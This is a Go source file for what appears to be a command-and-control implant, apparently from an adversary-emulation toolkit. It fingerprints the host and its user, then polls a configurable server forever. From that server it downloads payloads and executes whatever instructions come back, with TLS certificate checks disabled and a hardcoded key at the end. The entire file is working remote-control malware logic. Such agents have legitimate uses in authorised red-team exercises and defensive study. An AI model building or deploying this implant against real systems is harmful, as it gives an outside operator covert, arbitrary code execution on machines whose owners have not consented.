package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"net/http"
	"os"
	"os/user"
	"reflect"
	"runtime"
	"strconv"
	"time"

	"./api"
	"./execute"
	"./util"
)

var iteration = 60

func askForInstructions(profile map[string]interface{}) {
	commands := api.Instructions(profile)
	if commands != nil && len(commands.([]interface{})) > 0 {
		cmds := reflect.ValueOf(commands)
		for i := 0; i < cmds.Len(); i++ {
			cmd := cmds.Index(i).Elem().String()
			fmt.Println("[*] Running instruction")
			command := util.Unpack([]byte(cmd))
			api.Drop(profile["server"].(string), command["payload"].(string))
			api.Execute(profile, command)
		}
	} else {
		time.Sleep(time.Duration(iteration) * time.Second)
	}
}

func buildProfile(server string, group string, executors []string) map[string]interface{} {
	host, _ := os.Hostname()
	user, _ := user.Current()
	paw := fmt.Sprintf("%s$%s", host, user.Username)
	profile := make(map[string]interface{})
	profile["paw"] = paw
	profile["server"] = server
	profile["group"] = group
	profile["architecture"] = runtime.GOARCH
	profile["platform"] = runtime.GOOS
	profile["location"] = os.Args[0]
	profile["pid"] = strconv.Itoa(os.Getpid())
	profile["ppid"] = strconv.Itoa(os.Getppid())
	profile["executors"] = executors
	return profile
}

func main() {
	var executors execute.ExecutorFlags
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	server := flag.String("server", "http://localhost:8888", "The FQDN of the server")
	group := flag.String("group", "my_group", "Attach a group to this agent")
	flag.Var(&executors, "executors", "Comma separated list of executors (first listed is primary)")
	flag.Parse()
	if executors == nil {
		executors = []string{execute.DetermineExecutor(runtime.GOOS)}
	}
	profile := buildProfile(*server, *group, executors)
	for {
		askForInstructions(profile)
	}
}

var key = "9QRJPI8IVTUCXO14RSSJBR29ZUSBWV"